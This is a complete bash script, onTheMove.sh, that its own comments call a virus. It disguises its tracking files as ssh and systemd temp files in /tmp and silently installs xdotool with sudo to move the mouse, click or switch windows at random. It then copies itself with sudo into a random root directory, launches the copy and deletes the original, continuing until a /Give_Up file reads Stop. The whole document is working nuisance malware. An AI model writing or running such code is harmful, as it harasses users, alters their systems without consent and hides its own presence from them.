#!/bin/bash
#Important variables that make everything work
current="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
giveUp=`shuf -n 1 /Give_Up` 
doAnnoy=`shuf -i 0-5 -n 1`
oldTarget=`sed 's:/::g' /tmp/ssh-7NalEN3oIs3n`

#Checks if oldTarget file is empty, populates the file if it is empty
filter(){
if [ -z "$oldTarget" ]
then
	echo filler>/tmp/ssh-7NalEN3oIs3n
fi
}

#Checks if the user has given up, either stops the virus, or randomly selects the next directory
check(){
if [ $giveUp != Stop ]
then
	ls -1 -d /*/>/tmp/systemd-private-f1bbb5682a6e43889fcca9bd928176e2-daemon.service-Qf38bM
	grep -v "$oldTarget\|sys\|proc\|dev\|boot" /tmp/systemd-private-f1bbb5682a6e43889fcca9bd928176e2-daemon.service-Qf38bM>/tmp/ssh-l7IjnT5mI3t0
	rm /tmp/systemd-private-f1bbb5682a6e43889fcca9bd928176e2-daemon.service-Qf38bM
	target=`shuf -n 1 /tmp/ssh-l7IjnT5mI3t0`
	rm /tmp/ssh-l7IjnT5mI3t0
else
	echo "White flag has been raised, stopping script."
	sudo rm -- "$current/onTheMove.sh"
	exit
fi
}

#Checks what the doAnnoy varable rolled, if it matches anything it annoys the user
annoy(){
if [ $doAnnoy == 0 ]
then
	echo $doAnnoy
	sudo apt-get -y install xdotool &>/dev/null
	x=$(shuf -i 0-1920 -n 1)
        y=$(shuf -i 0-1080 -n 1)
	xdotool mousemove $x $y
fi

if [ $doAnnoy == 1 ]
then
	echo $doAnnoy
	sudo apt-get install xdotool &>/dev/null
	xdotool click 3
fi

if [ $doAnnoy == 2 ]
then
	echo $doAnnoy
	sudo apt-get install xdotool &>/dev/null
	xdotool key alt+Tab
fi
}


filter
annoy
check
echo $target
sleep 5
echo $target>/tmp/ssh-7NalEN3oIs3n
sudo cp $current/onTheMove.sh $target
/bin/bash $target"onTheMove.sh" &
sudo rm -- "$current/onTheMove.sh"
